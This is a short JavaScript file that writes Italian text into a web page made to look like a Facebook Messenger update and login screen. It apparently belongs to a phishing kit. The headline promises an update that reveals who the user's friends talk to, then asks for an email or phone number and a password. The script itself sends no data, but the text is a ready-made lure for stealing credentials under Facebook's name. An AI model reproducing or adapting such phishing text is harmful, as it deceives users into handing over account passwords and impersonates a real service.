var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="Aggiorna Messenger all'ultima versione per divertirti con le nuove funzionalità come sapere chi parla con i tuoi amici";
subMainParagraph.innerHTML ="Connettiti istantaneamente con le persone della tua vita. Accedi con Facebook per iniziare.";
updateButton.innerHTML ="aggiorna ora";
userInput.setAttribute("placeholder" , "Indirizzo e-mail o numero di telefono");
passInput.setAttribute("placeholder" , "Parola d'ordine");
logButton.setAttribute("value" , "Accesso");
checkBox.innerHTML ="Tienimi connesso";
